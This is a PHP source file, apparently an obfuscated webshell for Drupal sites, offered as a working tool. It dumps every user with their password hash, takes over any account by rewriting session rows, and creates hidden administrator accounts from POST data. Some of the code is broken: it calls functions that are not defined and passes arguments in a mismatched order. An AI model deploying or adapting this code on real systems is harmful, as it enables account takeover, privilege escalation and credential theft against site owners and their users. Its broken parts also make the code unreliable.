"<?php

// section.functions

/**
 * Hooks container
 */
$ERbs = array(
    // Hooks that are called directly before any page is rendered, useful to enforce authentication and similar
    "page_generation" => array(),
    // Hooks that are called to add isolated operations, isolated operations are operations that must be run in an
    // isolated environment meaning no other content should be rendered on the page except the operation result.
    // Example: file download, redirects, etc.
    "isolated_ops"    => array(),
    // Hooks that are called to add register features to the webshell
    "features"        => array(),
    // Named hooks that are called to render a page, ONLY the first matching hook is called.
    // This is a named array (aka object) => [hook_name => function1, hook_name => function2, ...]
    "GET_page"        => array(),
    // Named hooks that are called to handle a POST request, ONLY the first matching hook is called.
    // This is a named array (aka object) => [hook_name => function1, hook_name => function2, ...]
    "POST_operation"  => array(),
);

/**
 * Register a hook
 *
 * @param $ERb string The hook to register
 * @param $wfO string|array The function yVPb call or call_user_func compatible array
 *
 * @return void
 */
function ybmP($ERb, $wfO) {
    global $ERbs;

    $ERbs[$ERb][] = $wfO;
}

/**
 * Register a named hook
 *
 * @param $ERb string The hook to register
 * @param $ZRL string The name of the hook
 * @param $wfO string|array The function yVPb call or call_user_func compatible array
 *
 * @return void
 */
function yjMr($ERb, $ZRL, $wfO) {
    global $ERbs;

    // If the hook is already registered any new registration is ignored
    if (!empty($ERbs[$ERb][$ZRL])) {
        return;
    }

    $ERbs[$ERb][$ZRL] = $wfO;
}

/**
 * Call a hook
 *
 * @param $ERb string The hook to call
 * @param $Hjs array The arguments to pass to the hook (by reference)
 *
 * @return void
 */
function yGUy($ERb, &$Hjs = array()) {
    global $ERbs;

    foreach ($ERbs[$ERb] as $wfO) {
        call_user_func_array($wfO, $Hjs);
    }
}

/**
 * Call a named hook
 *
 * @param $ERb string The hook to call
 * @param $ZRL string The name of the hook
 * @param $Hjs array The arguments to pass to the hook (by reference)
 *
 * @return void
 */
function yStu($ERb, $ZRL, &$Hjs = array()) {
    global $ERbs;

    // If the hook is not registered, fail silently
    if (empty($ERbs[$ERb][$ZRL])) {
        return;
    }

    call_user_func_array($ERbs[$ERb][$ZRL], $Hjs);
}

// section.functions.end


$xqlAS = "X02";


$CDM = "I30";


$yub = "k33";


$tRi = "E42";


$VGK = "H64";


$aXz = "b02";


$NTp = "K96";


$Znu         = "g09";
$Znu_PREVIEW = "B11";


$VYD = "l95";


$nqi = "u86";
$yqb = "5457018979999e899eecb6fe7476081cd3556aafa0550bb17db3c5ae496be8b67d2314944184c014df17e12c5176de6c6e56a7bbef2045e4677fc76c0eca7cd9";
$cph = "9794cda69a3d9a4bcbee275de33947cb5b34b9d4b66cb88ce12f2b81fb6bc6d6b5816f48c3565f3cf7b631281d34795e06f256bb1faff9e861e9f8a7da73f1df";
$qUd = 'tr@~7;_a9]85B0_%.Yp$mnA#//!vvT4bY1N894?5$wCa:>p99)B^1n@';


$SMv = "d22";


$FJG = "c95";


$axU = "W30";


$kap = "k51";


$dud = "e73";

// inject: <?php

/**
 * Check if the request method is POST
 *
 * @return bool
 */
function yXXg() {
    return $_SERVER['REQUEST_METHOD'] === 'POST';
}

/**
 * Load the page or get the fallback page
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return mixed
 */
function yBjl($HpEs) {
    return isset($_GET['page']) ? $_GET['page'] : $HpEs[0]["op"];
}

/**
 * Render the page content by calling the named hook for the current page
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The page to render
 *
 * @return void
 */
function yATb($HpEs, $HRc) {
    global $GnR;
    // Load the page content by calling the named hook for the current page
    $LGQ = "";
    $qFg = array(&$LGQ, $HpEs, $HRc, $GnR);
    yStu("GET_page", $HRc, $qFg);

    // Render the page content
    echo $LGQ;
}

/**
 * Check if the operation is in the isolated operations list
 *
 * @param $VPY string The operation to check
 * @param $xnBsolated_ops array The isolated operations list
 *
 * @return bool
 */
function yGSi($VPY, $xnBsolated_ops) {
    return in_array($VPY, $xnBsolated_ops);
}

/**
 * Open the command output screen where output can be freely written
 *
 * @param bool $hAV Whether to capture the output or not
 * @param string $lfx Classes to apply to the command output screen
 * @param string $PLX Title of the command output screen
 * @param bool $Zkg Whether to remove the margin from the command output screen
 * @param bool $sRx Whether to remove the padding from the command output screen
 *
 * @return void|string Returns the output if $hAV is true
 */
function ylqR(
    $hAV = false,
    $lfx = "",
    $PLX = "Command output",
    $Zkg = false,
    $sRx = false
) {
if ($hAV) {
    ob_start();
}

?>
<div class="<?php
echo $Zkg ? "" : "ml-72 ";
echo $sRx ? "" : "py-10 ";
?>">
    <div class="container px-16">
        <div class="bg-zinc-900 font-mono text-sm overflow-auto rounded shadow-md text-white px-6 py-3">
            <h3 class="border-b border-zinc-700 text-sm font-semibold leading-8">
                <?= htmlentities($PLX) ?>
            </h3>
            <pre class="p-2 mt-2 <?= htmlentities($lfx) ?>"><?php

                if ($hAV) {
                    return ob_get_clean();
                }
                }

                /**
                 * Closes the command output screen
                 *
                 * @param bool $hAV Whether to capture the output or not
                 *
                 * @return void|string Returns the output if $hAV is true
                 */
                function yPrI($hAV = false) {
                if ($hAV) {
                    ob_start();
                }

                ?></pre>
        </div>
    </div>
</div>
<?php

if ($hAV) {
    return ob_get_clean();
}
}

/**
 * Create a page with the given elements
 *
 * @param $RpM array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The
 *     features container
 * @param $GnR string CSS to include in the page
 * @param $paA string Current page to highlight in the navigation
 * @param $MKZ string[] Elements to include in the page
 *
 * @return string
 */
function yOWa($RpM, $GnR, $paA, $MKZ) {
$qFg = array(&$MKZ, $paA, $GnR);
yGUy("page_generation", $qFg);

ob_start();
?>
<html lang="en">
<head>
    <title>5<1-4</title>
    <style><?= $GnR ?></style>
    <script>r5
        ##
        5</script>
</head>
<body class="bg-white">
<div class="fixed inset-y-0 z-50 w-72 flex flex-col">
    <div class="flex flex-grow flex-col gap-y-5 overflow-y-auto bg-zinc-900 px-6 pb-4">
        <div class="flex items-center h-16 shrink-0">
            <h1 class="text-2xl text-white">5<1-4</h1>
        </div>
        <nav class="flex flex-1 flex-col">
            <ul role="list" class="flex flex-1 flex-col gap-y-7">
                <li>
                    <ul role="list" class="-mx-2">
                        <?php
                        foreach ($RpM as $HpE => $Lmn) {
                            echo ykBF($HpE, $paA, $Lmn);
                        }
                        ?>
                    </ul>
                </li>
            </ul>
        </nav>
    </div>
</div>
<div class="ml-72">
    <main class="py-10">
        <div class="container px-16">
            <?php
            foreach ($MKZ as $Hbq) {
                echo $Hbq;
            }
            ?>
        </div>
    </main>
</div>
<?php
return ob_get_clean();
}

/**
 * Create a navigation link
 *
 * @param $HRc string Page to link to
 * @param $paA string Current page to highlight
 * @param $Lmn array{title: string, description: string, svg: string, hidden?: bool, op: string} Nav item
 *     definition
 *
 * @return string
 */
function ykBF($HRc, $paA, $Lmn) {
    if ($Lmn["hidden"]) {
        return "";
    }

    ob_start();
    ?>
    <li>
        <a href="?page=<?= urlencode($HRc) ?>"
           class="flex gap-x-3 rounded p-2 text-sm font-semibold leading-6
           <?= ylNd($paA, $HRc) ?>
           "
           id="nav-<?= $HRc ?>"
        >
            <div class="flex items-center justify-center">
                <?= $Lmn["svg"] ?>
            </div>
            <?= htmlentities($Lmn["title"]) ?>
        </a>
    </li>
    <?php
    return ob_get_clean();
}

/**
 * Returns the classes to apply to the navigation item highlighted because it's the current page
 *
 * @param $paA string Current page
 * @param $iiH string Page to check if it's the current page
 *
 * @return string
 */
function ylNd($paA, $iiH) {
    if ($paA === $iiH) {
        return "bg-zinc-800 text-white";
    }
    return "text-zinc-400";
}

/**
 * Format bytes to human-readable format
 *
 * @param $saM array|int|float Bytes to format
 *
 * @return string
 */
function yAVX($saM) {
    $Osw = array('B', 'KB', 'MB', 'GB', 'TB');

    $saM = max($saM, 0);
    $TxS = floor(($saM ? log($saM) : 0) / log(1024));
    $TxS = min($TxS, count($Osw) - 1);

    // Calculate size in the chosen unit
    $saM /= pow(1024, $TxS);

    // Format with three-point precision
    return yQPw(round($saM, 3) . ' ' . $Osw[$TxS]);
}

/**
 * Download a file in chunks
 *
 * @param $ozK string Path to the file to download
 * @param $Mdj int Size of the file
 * @param $qHt string|null Name of the file to download or null to use the original filename
 *
 * @return void
 */
function yDDm($ozK, $Mdj, $qHt = null) {
    $gmX = 4096; // Adjust chunk size as needed

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header(
        'Content-Disposition: attachment; filename="' .
        (!empty($qHt) ? $qHt : basename($ozK)) // Use the original filename if not provided
        . '"'
    );
    header('Content-Transfer-Encoding: chunked');
    header('Content-Length: ' . $Mdj); // Set content length for progress tracking

    $OKy = fopen($ozK, 'rb');

    while (!feof($OKy)) {
        $VNM = fread($OKy, $gmX);
        echo $VNM;
        flush();     // Flush output buffer after sending each chunk
    }

    fclose($OKy);
}

/**
 * Create a code highlight element
 *
 * @param $MGw float|int|string Code to highlight
 *
 * @return string
 */
function ylJy($MGw) {
    ob_start();
    ?>
    <code class="font-mono bg-zinc-100 text-zinc-900 text-sm px-2 py-1 rounded mx-1 select-all">
        <?= htmlentities($MGw) ?>
    </code>
    <?php
    return ob_get_clean();
}

/**
 * Pad a string to the left with spaces
 *
 * @param $Xlp string String to pad
 * @param $LYi int Length to pad to
 *
 * @return string
 */
function yQPw($Xlp, $LYi = 10) {
    // Ensure string and pad length are valid
    if (!is_string($Xlp) || !is_int($LYi) || $LYi <= 0) {
        return $Xlp; // Return unmodified string for invalid input
    }

    // Pad the string with spaces using str_pad
    return str_pad($Xlp, $LYi);
}

/**
 * Convert a Unix timestamp to a date string
 *
 * @param $pEN int Unix timestamp
 *
 * @return string
 */
function yISu($pEN) {
    return date('Y-m-d H:i:s', $pEN);
}

/**
 * Create a page header
 *
 * @param $PLX string Title of the page
 * @param $uAF string Description of the page
 *
 * @return string
 */
function yOWaHeader($PLX, $uAF) {
    ob_start();
    ?>
    <div class="lg:flex lg:items-center lg:justify-between">
        <div class="min-w-0 flex-1">
            <h2 class="text-2xl font-bold leading-7 text-zinc-900 sm:truncate sm:text-3xl sm:tracking-tight">
                <?= htmlentities($PLX) ?>
            </h2>
            <div class="mt-1 flex flex-col sm:mt-0 sm:flex-row sm:flex-wrap sm:space-x-6">
                <div class="mt-2 flex items-center text-sm text-zinc-500">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
                         stroke-width="1.5" stroke="currentColor"
                         class="mr-1.5 h-5 w-5 flex-shrink-0 text-zinc-400">
                        <path stroke-linecap="round" stroke-linejoin="round"
                              d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z"/>
                    </svg>
                    <?= $uAF ?>
                </div>
            </div>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a form with the given elements
 *
 * @param $VPY string Operation to perform when the form is submitted
 * @param $ZHi string Action to perform when the form is submitted
 * @param $MKZ string[] Elements to include in the form
 * @param $TTi string Method to use for the form, default is "post"
 *
 * @return string
 */
function yUQj(
    $VPY,
    $ZHi,
    $MKZ,
    $TTi = "post",
    $xqlRQ = "Run operation",
    $lfx = "flex flex-col gap-y-6 max-w-xl mt-8"
) {
    ob_start();
    ?>
    <form action="<?= $ZHi ?>" method="<?= htmlentities($TTi) ?>"
          class="<?= htmlentities($lfx) ?>">
        <input type="hidden" name="N62" value="<?= htmlentities($VPY) ?>"/>
        <?php
        foreach ($MKZ as $Hbq) {
            echo $Hbq;
        }
        ?>
        <button type="submit"
                class="rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                       hover:bg-zinc-700 transition-all duration-300">
            <?= htmlentities($xqlRQ) ?>
        </button>
    </form>
    <?php
    return ob_get_clean();
}

/**
 * Create an input field
 *
 * @param $qdq string Type of the input
 * @param $tbw string Label for the input
 * @param $ZRL string Name of the input
 * @param $ToK string Placeholder for the input
 * @param $uAF string Description of the input
 * @param $Ocl bool Whether is the input required
 *
 * @return string
 */
function yvFX(
    $qdq,
    $tbw,
    $ZRL,
    $ToK,
    $uAF,
    $Ocl = false,
    $cje_param = null,
    $iam = null
) {
    $ZRL = htmlentities($ZRL);

    ob_start();
    if ($qdq !== "textarea") {
        ?>
        <div class="flex flex-col gap-y-2 <?= $qdq === "hidden" ? "hidden" : ""; ?>"
             id="<?= $ZRL ?>-container">
            <label for="<?= $ZRL ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                <?= htmlentities($tbw) ?>
                <?php
                if ($Ocl) {
                    echo "<sup class='text-red-500'>*</sup>";
                }
                ?>
            </label>
            <input type="<?= htmlentities($qdq) ?>"
                   id="<?= $ZRL ?>"
                   name="<?= $ZRL ?>"
                   placeholder="<?= htmlentities($ToK) ?>"
                <?php
                if ($Ocl) {
                    echo "required ";
                }
                if (!empty($cje_param)) {
                    echo "value=\"" . htmlentities($_GET[$cje_param]) . "\" ";
                }
                elseif (!empty($iam)) {
                    echo "value=\"" . htmlentities($iam) . "\" ";
                }
                ?>
                   class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400">
            <p class="text-sm text-zinc-500">
                <?= $uAF ?>
            </p>
        </div>
        <?php
    }
    else {
        ?>
        <div class="flex flex-col gap-y-2" id="<?= $ZRL ?>-container">
            <label for="<?= $ZRL ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                <?= $tbw ?>
                <?php
                if ($Ocl) {
                    echo "<sup class='text-red-500'>*</sup>";
                }
                ?>
            </label>
            <textarea id="<?= $ZRL ?>"
                      name="<?= $ZRL ?>"
                      placeholder="<?= htmlentities($ToK) ?>"
                <?php
                if ($Ocl) {
                    echo "required";
                }
                ?>
                      class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400"
                      rows="5"
            ><?php
                if (!empty($iam)) {
                    echo htmlentities($iam);
                }
                ?></textarea>
            <p class="text-sm text-zinc-500">
                <?= $uAF ?>
            </p>
        </div>
        <?php
    }
    return ob_get_clean();
}

/**
 * Create a select field
 *
 * @param $tbw string Label for the select
 * @param $ZRL string Name of the select
 * @param $yhe array<{label: string, value: string, disabled?: bool, selected?: bool}> Options for the select
 * @param $Ocl bool Whether the select is required
 * @param $Puq string|null Reason for the option to be disabled, if any
 *
 * @return string
 */
function yQAj($tbw, $ZRL, $yhe, $Ocl = false, $Puq = null) {
    $ZRL = htmlentities($ZRL);

    ob_start();
    ?>
    <div id="<?= $ZRL ?>-container">
        <label for="<?= $ZRL ?>" class="block text-sm font-medium leading-6 text-gray-900">
            <?= $tbw ?>
            <?php
            if ($Ocl) {
                echo "<sup class='text-red-500'>*</sup>";
            }
            ?>
        </label>
        <select id="<?= $ZRL ?>" name="<?= $ZRL ?>"
                class="mt-2 block w-full rounded-md border-0 py-1.5 pl-3 pr-10 text-gray-900 ring-1 ring-inset
                ring-gray-300 focus:ring-2 focus:ring-indigo-600 sm:text-sm sm:leading-6"
            <?php
            if ($Ocl) {
                echo "required ";
            }
            ?>
        >
            <?php
            foreach ($yhe as $pPw) {
                echo "<option value='" . htmlentities($pPw["value"]) . "' " .
                     ($pPw["disabled"] ? "disabled " : "") .
                     ($pPw["selected"] ? "selected " : "") .
                     ">" .
                     htmlentities($pPw["label"]) .
                     ($pPw["disabled"] && !empty($Puq) ? " - " . htmlentities($Puq) : "") .
                     "</option>";
            }
            ?>
        </select>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a checkbox field
 *
 * @param $ZRL string Name of the checkbox
 * @param $tbw string Label for the checkbox
 * @param $uAF string Description of the checkbox
 * @param $xnBs_checked bool Whether the checkbox is checked
 * @param $iam string Value of the checkbox, default is "y"
 * @param $beI string|null OnClick event for the checkbox
 *
 * @return string
 */
function ypHp($ZRL, $tbw, $uAF, $xnBs_checked = false, $iam = "y", $beI = null) {
    $ZRL = htmlentities($ZRL);

    ob_start();
    ?>
    <div class="relative flex items-start" id="<?= $ZRL ?>-container">
        <div class="flex h-6 items-center">
            <input id="<?= $ZRL ?>" name="<?= $ZRL ?>" type="checkbox"
                   class="h-4 w-4 text-indigo-600 border-zinc-300 rounded focus:ring-indigo-600 "
                   value="<?= htmlentities($iam) ?>"
                <?php
                if ($xnBs_checked) {
                    echo "checked ";
                }
                if ($beI !== null) {
                    echo "onclick=\"$beI\" ";
                }
                ?>
            >
        </div>
        <div class="ml-3 text-sm leading-6 flex flex-col select-none">
            <label for="<?= $ZRL ?>" class="font-medium text-zinc-900 w-full cursor-pointer">
                <?= htmlentities($tbw) ?>
            </label>
            <p class="text-zinc-500 cursor-pointer" onclick="document.getElementById('<?= $ZRL ?>').click()">
                <?= $uAF ?>
            </p>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Check if the checkbox is active
 *
 * @param $ZRL string Name of the checkbox
 *
 * @return bool
 */
function yfJu($ZRL) {
    return isset($_POST[$ZRL]) && $_POST[$ZRL] === "y";
}

/**
 * Array column function yojm PHP < 5.5
 *
 * @param $QSu array Array to extract the column from
 * @param $mqG string Column name to extract
 *
 * @return array Extracted column
 */
function yXVt($QSu, $mqG) {
    return array_map(function ($Hbq) use ($mqG) { return $Hbq[$mqG]; }, $QSu);
}

/**
 * Print an ASCII table from the given data
 *
 * @param $ybQ array[] Data to print
 *
 * @return void
 */
function yITb($ybQ) {
    // Get column headers
    $iOxs = array_keys($ybQ[0]);

    // Calculate column widths
    $ETb = array();
    foreach ($iOxs as $iOx) {
        $ETb[$iOx] = max(array_map('strlen', yXVt($ybQ, $iOx))) + 2;
    }

    // Print top row
    echo "+";
    foreach ($iOxs as $iOx) {
        echo str_repeat("-", $ETb[$iOx]);
        echo "+";
    }
    echo PHP_EOL;

    // Print header row
    echo "|";
    foreach ($iOxs as $iOx) {
        printf("%-{$ETb[$iOx]}s|", htmlentities($iOx));
    }
    echo PHP_EOL;

    // Print divider row
    echo "+";
    foreach ($iOxs as $iOx) {
        echo str_repeat("-", $ETb[$iOx]);
        echo "+";
    }
    echo PHP_EOL;

    // Print table rows
    foreach ($ybQ as $DdP) {
        echo "|";
        foreach ($DdP as $mkq => $iam) {
            printf("%-{$ETb[$mkq]}s|", htmlentities($iam));
        }
        echo PHP_EOL;
    }

    // Print bottom row
    echo "+";
    foreach ($iOxs as $iOx) {
        echo str_repeat("-", $ETb[$iOx]);
        echo "+";
    }
    echo PHP_EOL;
}

/**
 * Create an alert element on the page
 *
 * @param $PLX string Title of the alert box
 * @param $CcZ string Message of the alert
 *
 * @return string
 */
function yKfD($PLX, $CcZ) {
    ob_start();
    ?>
    <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 rounded mt-4 text-zinc-900 flex gap-x-4">
        <div class="flex items-start justify-center text-yellow-600">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
                 stroke="currentColor" class="w-8 h-8">
                <path stroke-linecap="round" stroke-linejoin="round"
                      d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z"/>
            </svg>
        </div>
        <div class="flex flex-col">
            <h3 class="text-sm leading-7 font-semibold">
                <?= htmlentities($PLX) ?>
            </h3>
            <p class="text-sm">
                <?= $CcZ ?>
            </p>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create the example page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function ynsT(&$HRc_content, $HpEs, $HRc, $GnR) {
    $GIz         = ypRb();
    $HRc_content = yOWa(
        $HpEs,
        $HRc,
        $GnR,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            ymakeTable(
                "Users",
                "Drupal users to impersonate",
                $GIz,
                array(
                    "username" => "Username",
                    "email"    => "Email",
                    "active"   => "Active",
                    "blocked"  => "Blocked",
                    "roles"    => "Roles",
                    "actions"  => "Actions",
                ),
                "
                        <dialog id='create-drupal-user' class='p-4 rounded w-1/3'>" .
                yUQj(
                    $HRc,
                    $_SERVER["REQUEST_URI"],
                    array(
                        "<div class='flex items-center justify-between'>
                            <h3 class='text-lg font-semibold text-zinc-800'>Create Drupal user</h3>
                            <button onclick='document.getElementById(\"create-drupal-user\").close(); document.getElementById(\"create-drupal-user\").classList.remove(\"flex\")' 
                                class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
                                &times;
                            </button>
                        </div>",
                        yvFX(
                            "text",
                            "Username",
                            "h39",
                            "admin",
                            "Username of the user to create.",
                            true
                        ),
                        yvFX(
                            "text",
                            "Email",
                            "A64",
                            "admin@example.com",
                            "Email of the user to create.",
                            true
                        ),
                        yvFX(
                            "password",
                            "Password",
                            "u43",
                            "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                            "Password of the user to create.",
                            true
                        ),
                    ),
                    "post",
                    "Create user",
                    "flex flex-col gap-y-6 mx-auto w-full"
                )
                . "
                    </dialog>
                    <button onclick='document.getElementById(\"create-drupal-user\").showModal()' 
                        class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                            hover:bg-zinc-700 transition-all duration-300'>
                        Create user
                    </button>"
            ),
        )
    );
}

/**
 * Lists all Drupal users
 */
function ypRb() {
    global $xqlAS;

    // Load all user roles.
    $Ulhs = \Drupal\user\Entity\Role::loadMultiple();
    // Get all permissions.
    $CjXs = \Drupal::service('user.permissions')
        ->getPermissions();

    // Get a list of all users.
    $cje = \Drupal::entityQuery('user')
        ->accessCheck(false);
    $BsN = $cje->execute();

    // Load user entities.
    $GIz = \Drupal\user\Entity\User::loadMultiple($BsN);

    $Qdp = array();

    // Iterate through each user.
    foreach ($GIz as $ELM) {
        $fxgial_result = array();

        $ELMname                   = $ELM->getAccountName();
        $fxgial_result["username"] = empty($ELMname) ? "Anonymous" : $ELMname;
        $fxgial_result["id"]       = $ELM->id();
        $fxgial_result["email"]    = $ELM->getEmail();
        $fxgial_result["active"]   = $ELM->isActive() ? "Yes" : "No";
        $fxgial_result["blocked"]  = $ELM->isBlocked() ? "Yes" : "No";
        $fxgial_result["uuid"]     = $ELM->uuid();
        $fxgial_result["password"] = $ELM->getPassword();
        $fxgial_result["actions"]  = !empty($ELMname)
            ? yUQj(
                $xqlAS,
                $_SERVER["REQUEST_URI"],
                array(
                    yvFX(
                        "hidden",
                        "Username",
                        "s82",
                        "",
                        "Username of the user to impersonate.",
                        true,
                        null,
                        $fxgial_result["id"]
                    ),
                ),
                "post",
                "Impersonate",
                "flex flex-col max-w-xl mb-0"
            )
            : "";

        // Get assigned roles for the user.
        $ELM_roles              = $ELM->getRoles();
        $fxgial_result["roles"] = implode(", ", $ELM_roles);

        $Qdp[] = $fxgial_result;
    }

    return $Qdp;
}

/**
 * Impersonate a Drupal user
 *
 * @param $ELMname string Username of the user to impersonate
 */
function yhby($xnBd) {
    // Load the user by username.
    $ELM = \Drupal\user\Entity\User::load($xnBd);

    // Check if the user exists.
    if ($ELM) {
        $ybQbase = \Drupal::database();

        $jTa             = true;
        $_sf2_meta       = array(
            // session timestamp
            "u" => time(),
            // login timestamp as from user_field_data
            "c" => time(),
            // max session lifetime as per core.services.yml
            "l" => 2000000,
            // csrf token seed - set via Crypt::randomBytesBase64()
            "s" => \Drupal\Component\Utility\Crypt::randomBytesBase64(),
        );
        $_sf2_attributes = array(
            "uid" => "$xnBd",
        );

        $qAn = $ybQbase->getPrefix();

        $Vzw = "auth|" .
               serialize($jTa) .
               "_sf2_meta|" .
               serialize($_sf2_meta) .
               "_sf2_attributes|" .
               serialize($_sf2_attributes);

        try {
            $ybQbase->query(
                "update {$qAn}sessions as s set s.session=:a, timestamp=:b, uid=:c where sid=:d",
                array(
                    ":a" => $Vzw,
                    ":b" => $_sf2_meta['u'],
                    ":c" => $xnBd,
                    ":d" => \Drupal\Component\Utility\Crypt::hashBase64(session_id()),
                )
            )
                ->execute();
        }
        catch (Exception $xql) {
            // Uncaught exception as for some reason it fail also when the query executes successfully
        }

        // Set the authenticated user
        Drupal::currentUser()
            ->setAccount($ELM);
    }

    return new \Symfony\Component\HttpFoundation\RedirectResponse('/admin');
}

/**
 * Adds a Drupal administrator user.
 *
 * @param $ELMname string The username of the new user.
 * @param $IDs string The email address of the new user.
 * @param $YeY string The password for the new user.
 */
function yFAg($ELMname, $IDs, $YeY) {
    // Load the user roles.
    $Ulhs = \Drupal\user\Entity\Role::loadMultiple();

    // Define the roles for the administrator user.
    $VZL = array(
        'administrator',
    );

    // Create a new user entity.
    $ELM = \Drupal\user\Entity\User::create();

    // Set the username, email, and password.
    $ELM->setUsername($ELMname);
    $ELM->setEmail($IDs);
    $ELM->setPassword($YeY);

    // Set the user status to active.
    $ELM->activate();

    // Assign roles to the user.
    foreach ($VZL as $Ulh) {
        if (isset($Ulhs[$Ulh])) {
            $ELM->addRole($Ulh);
        }
    }

    // Save the user.
    $ELM->save();
}

/**
 * Handle the login operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return mixed
 */
function yzup($VPY, $HpEs) {
    if (!empty($_POST["s82"])) {
        return yhby($_POST["s82"]);
    }
    elseif (!empty($_POST["h39"]) &&
            !empty($_POST["A64"]) &&
            !empty($_POST["u43"])) {
        yFAg(
            $_POST["h39"],
            $_POST["A64"],
            $_POST["u43"]
        );

        return new \Symfony\Component\HttpFoundation\RedirectResponse($_SERVER["REQUEST_URI"]);
    }
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $xnBsolated_ops array The isolated operations container
 *
 * @return void
 */
function ylyW(&$xnBsolated_ops) {
    global $xqlAS;

    $xnBsolated_ops[] = $xqlAS;
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yGdW(&$HpEs) {
    global $xqlAS;

    $HpEs[] = array(
        "title"       => "Impersonate Drupal user",
        "description" => "Impersonate a Drupal user by changing the current session.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
</svg>',
        "op"          => $xqlAS,
    );
}


/**
 * Create the example page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function yknc(&$HRc_content, $HpEs, $HRc, $GnR) {
    $Ulhs        = yKfq();
    $HRc_content = yOWa(
        $HpEs,
        $HRc,
        $GnR,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            ymakeTable(
                "Roles",
                "Drupal roles and their permissions",
                $Ulhs,
                array(
                    "role"        => "Role",
                    "permissions" => "Permissions",
                )
            ),
        )
    );
}

/**
 * Get the list of Drupal roles
 *
 * @return array
 */
function yKfq() {
    $Ulhs = \Drupal\user\Entity\Role::loadMultiple();
    $CjXs = \Drupal::service('user.permissions')
        ->getPermissions();

    $Qdp = array();

    foreach ($Ulhs as $Ulh) {
        $Ulh_permissions = array();

        foreach ($CjXs as $CjX => $CjX_info) {
            if ($Ulh->hasPermission($CjX)) {
                $Ulh_permissions[] = "<li>" . htmlentities($CjX_info['title']) . "</li>";
            }
        }

        $Qdp[] = array(
            "id"          => $Ulh->id(),
            "role"        => $Ulh->label(),
            "permissions" => "<ul class='list-disc list-inside'>" . implode("", $Ulh_permissions) . "</ul>",
        );
    }

    return $Qdp;
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yKLr(&$HpEs) {
    global $CDM;

    $HpEs[] = array(
        "title"       => "List Drupal roles",
        "description" => "List all Drupal roles and their permissions.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 10.5V6.75a4.5 4.5 0 1 1 9 0v3.75M3.75 21.75h10.5a2.25 2.25 0 0 0 2.25-2.25v-6.75a2.25 2.25 0 0 0-2.25-2.25H3.75a2.25 2.25 0 0 0-2.25 2.25v6.75a2.25 2.25 0 0 0 2.25 2.25Z" />
</svg>',
        "op"          => $CDM,
    );
}


/**
 * Create the example page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
